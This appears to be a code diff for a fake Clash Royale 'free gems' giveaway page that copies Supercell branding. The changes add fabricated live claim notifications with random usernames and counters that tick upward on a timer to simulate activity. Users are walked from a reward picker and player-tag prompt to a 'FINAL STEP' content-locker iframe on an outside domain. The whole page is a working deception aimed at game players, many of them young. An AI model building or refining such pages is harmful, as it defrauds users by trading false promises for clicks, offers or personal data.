@@ -28,18 +28,16 @@
 
         @keyframes moveBackground { from { background-position: 0 0, 25px 25px; } to { background-position: 50px 50px, 75px 75px; } }
 
-        /* --- TIKTOK OVERLAY --- */
         #ttOverlay { position: fixed; inset: 0; background: #000; display: none; z-index: 9999999; }
         #tutorialGif { width: 100%; height: 100%; object-fit: cover; }
 
-        /* LIVE NOTIFICATION (TOP) */
-        .live-bar { background: rgba(0,0,0,0.6); padding: 8px 0; font-size: 12px; height: 20px; border-bottom: 2px solid var(--cr-gold); }
-        #liveText { transition: all 0.5s ease; display: inline-block; }
+        /* LIVE BAR */
+        .live-bar { background: rgba(0,0,0,0.7); padding: 8px 0; font-size: 13px; height: 20px; border-bottom: 2px solid var(--cr-gold); overflow: hidden; }
+        #liveText { transition: transform 0.5s ease-in-out, opacity 0.5s; display: inline-block; width: 100%; }
 
         .logo-container { margin: 25px 0; }
         .logo { width: 170px; filter: drop-shadow(0 8px 12px rgba(0,0,0,0.4)); }
 
-        /* STATS PANEL (BRAWL STYLE) */
         .stats-panel {
             background: rgba(0, 50, 120, 0.85); border: 3px solid var(--cr-gold);
             border-radius: 25px; display: inline-flex; gap: 40px; padding: 20px 45px; margin-bottom: 30px;
@@ -53,7 +51,6 @@
             background: rgba(255, 255, 255, 0.1); border-radius: 40px; padding: 25px 15px;
         }
 
-        /* 3-COLUMN GRID */
         .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
 
         .card {
@@ -87,12 +84,21 @@
         .modal-box {
             background: var(--cr-white); width: 85%; max-width: 400px;
             border: 5px solid var(--cr-gold); border-radius: 30px;
-            padding: 30px 15px; color: #004a8d;
+            padding: 20px 15px; color: #004a8d; text-align: center;
         }
+
+        /* PHOTO D REWARD F MODAL */
+        .selected-reward-preview {
+            width: 100px; height: 100px; object-fit: contain; margin: 10px auto;
+            filter: drop-shadow(0 5px 10px rgba(0,0,0,0.2));
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+
         .modal-input {
             background: #f0f0f0; border: 3px solid var(--cr-gold); border-radius: 18px;
             width: 90%; padding: 15px; font-family: 'Lilita One'; font-size: 22px; 
-            text-align: center; outline: none; margin: 20px 0;
+            text-align: center; outline: none; margin: 15px 0;
         }
         .btn-continue {
             background: linear-gradient(180deg, #ffcc00 0%, #ff9900 100%);
@@ -100,13 +106,8 @@
             color: white; font-family: 'Lilita One'; font-size: 32px; padding: 12px 0; width: 100%; cursor: pointer;
         }
 
-        /* FOOTER (NICHAN BHAL L-PHOTO) */
         footer { margin-top: 60px; background: #000; padding: 50px 20px; text-align: left; color: #ffffff; font-family: sans-serif; }
-        .footer-top { display: flex; justify-content: space-between; max-width: 500px; margin: 0 auto 30px auto; flex-wrap: wrap; gap: 20px; }
-        .store-btns img { height: 40px; border-radius: 5px; border: 1px solid #333; margin-right: 5px; }
         .footer-bottom { max-width: 500px; margin: 0 auto; display: flex; justify-content: space-between; border-top: 1px solid #333; padding-top: 30px; }
-        .legal-links { display: flex; flex-direction: column; gap: 12px; }
-        .legal-links a { color: white; text-decoration: none; font-size: 14px; font-weight: bold; opacity: 0.8; }
         .sc-logo-footer { width: 120px; margin-top: 20px; }
     </style>
 </head>
@@ -115,22 +116,21 @@
     <div id="ttOverlay"><img src="tutorial.gif" id="tutorialGif"></div>
 
     <div class="live-bar">
-        <span id="liveText">🔥 <b>Jaxson_BS</b> claimed <span>2000 GEMS!</span></span>
+        <div id="liveText">🔥 <b>Loading...</b></div>
     </div>
 
     <div class="logo-container">
-        <!-- Logo Clash Royale li zdt -->
         <img src="./clashro.PNG" class="logo">
     </div>
 
     <div class="stats-panel">
         <div class="stat-box">
             <div style="font-size: 10px;"><span style="color:#ff4444;">●</span> LIVE</div>
-            <span class="stat-val" id="claimed">3,122</span>
+            <span class="stat-val" id="live_claimed">3,122</span>
         </div>
         <div class="stat-box">
             <div style="font-size: 10px;"><span style="color:#00ccff;">●</span> ONLINE</div>
-            <span class="stat-val" id="online">1,088</span>
+            <span class="stat-val" id="live_online">1,088</span>
         </div>
     </div>
 
@@ -139,51 +139,35 @@
         <div class="grid" id="mainGrid"></div>
     </div>
 
-    <!-- Modals -->
+    <!-- MODAL DYAL SMYA (B PHOTO) -->
     <div class="modal-overlay" id="modalTag">
         <div class="modal-box">
-            <h2 style="margin:0">CONNECT PLAYER</h2>
-            <input type="text" class="modal-input" id="playerTag" placeholder="#PLAYER_TAG" maxlength="12">
+            <h3 style="margin:0; color: #0056b3;">YOU SELECTED:</h3>
+            <!-- Hna fin ghadi t-affichager l-photo -->
+            <img id="rewardDisplay" src="" class="selected-reward-preview">
+            <h2 id="rewardNameDisplay" style="margin:5px 0; font-size: 18px;">REWARD</h2>
+            
+            <input type="text" class="modal-input" id="playerTag" placeholder="PLAYER TAG OR NAME" maxlength="15">
             <button class="btn-continue" onclick="goToLocker()">CONTINUE</button>
         </div>
     </div>
 
     <div class="modal-overlay" id="modalLocker">
-        <div class="modal-box">
-            <h2 style="margin:0">VERIFICATION</h2>
-            <div style="background:#000; border-radius:20px; height:400px; margin-top:15px; overflow:hidden;">
+        <div class="modal-box" style="max-width: 450px; padding: 10px;">
+            <h2 style="margin:10px 0;">FINAL STEP</h2>
+            <div style="background:#000; border-radius:20px; height:450px; overflow:hidden;">
                 <iframe src="https://checkmyapp.space/cl/i/822w96" style="width:100%; height:100%; border:none;"></iframe>
             </div>
         </div>
     </div>
 
     <footer>
-        <div class="footer-top">
-            <div>
-                <h4>Download our games</h4>
-                <div class="store-btns">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg">
-                </div>
-            </div>
-            <div>
-                <h4>Follow us</h4>
-                <div style="font-size: 22px; display: flex; gap: 15px;">
-                    <i class="fab fa-youtube"></i> <i class="fab fa-facebook-f"></i> <i class="fab fa-discord"></i>
-                </div>
-            </div>
-        </div>
         <div class="footer-bottom">
-            <div class="legal-links">
-                <a href="#">Terms of Service</a>
-                <a href="#">Privacy Policy</a>
-                <a href="#">Parent's Guide</a>
-                <a href="#">Safe and Fair Play</a>
-                <a href="#">Other Legal Docs</a>
+            <div style="display:flex; flex-direction:column; gap:10px;">
+                <a href="#" style="color:white; text-decoration:none; font-size:14px;">Privacy Policy</a>
+                <a href="#" style="color:white; text-decoration:none; font-size:14px;">Terms of Service</a>
             </div>
             <div style="text-align: right;">
-                <p style="font-size: 12px; opacity: 0.6;">Supercell Oy<br>Jätkäsaarenlaituri 1<br>00180 Helsinki, Finland</p>
-                <!-- Logo Supercell li zdt -->
                 <img src="./super.JPG" class="sc-logo-footer">
             </div>
         </div>
@@ -208,28 +192,50 @@
             {n: "GOBLINS", q: "X1", img: "goblins.PNG"}
         ];
 
+        const usernames = ["Mohamed_JKK", "Daniel_Ulta", "Zeneex_99", "Alpha_CR", "Shadow_X", "EliteGamer", "KingRoyale", "Hamza_92", "Omar_CR", "Anass_GG"];
+
         const grid = document.getElementById('mainGrid');
-        rewardsData.forEach(r => {
+        rewardsData.forEach((r, index) => {
             grid.innerHTML += `<div class="card">
                 <div class="item-name">${r.n}</div>
                 <div class="img-box"><img src="./${r.img}" class="item-img" onerror="this.src='https://via.placeholder.com/80'"></div>
                 <div class="price-line">${r.q} FREE</div>
-                <button class="btn-claim" onclick="openTagModal()">CLAIM</button>
+                <button class="btn-claim" onclick="openTagModal(${index})">CLAIM</button>
             </div>`;
         });
 
-        const users = ["Mohamed_JKK", "Zeneex_99", "Daniel_Ulta", "Alpha_CR"];
+        // FUNCTION BACH T-AFFICHAGER L-PHOTO D REWARD
+        function openTagModal(index) {
+            const selected = rewardsData[index];
+            document.getElementById('rewardDisplay').src = `./${selected.img}`;
+            document.getElementById('rewardNameDisplay').innerText = selected.n;
+            document.getElementById('modalTag').style.display = 'flex';
+        }
+
+        // STATS DYNAMIC
+        let onlineCount = 1088;
+        let claimedCount = 3122;
         setInterval(() => {
+            onlineCount += Math.floor(Math.random() * 11) - 5;
+            claimedCount += Math.floor(Math.random() * 2);
+            document.getElementById('live_online').innerText = onlineCount.toLocaleString();
+            document.getElementById('live_claimed').innerText = claimedCount.toLocaleString();
+        }, 2500);
+
+        // LIVE NOTIF
+        function updateLiveNotification() {
             const liveText = document.getElementById('liveText');
+            const randomUser = usernames[Math.floor(Math.random() * usernames.length)];
+            const randomGems = [2000, 5000, 10000, "Pass Royale"][Math.floor(Math.random() * 4)];
             liveText.style.opacity = '0';
             setTimeout(() => {
-                const u = users[Math.floor(Math.random()*users.length)];
-                liveText.innerHTML = `🔥 <b>${u}</b> claimed <span>10,000 GEMS!</span>`;
+                liveText.innerHTML = `🔥 <b>${randomUser}</b> just claimed <span style="color:var(--cr-gold)">${randomGems}</span>!`;
                 liveText.style.opacity = '1';
             }, 500);
-        }, 4000);
+        }
+        setInterval(updateLiveNotification, 4000);
+        updateLiveNotification();
 
-        function openTagModal() { document.getElementById('modalTag').style.display = 'flex'; }
         function goToLocker() {
             if(document.getElementById('playerTag').value.length > 2) {
                 document.getElementById('modalTag').style.display = 'none';
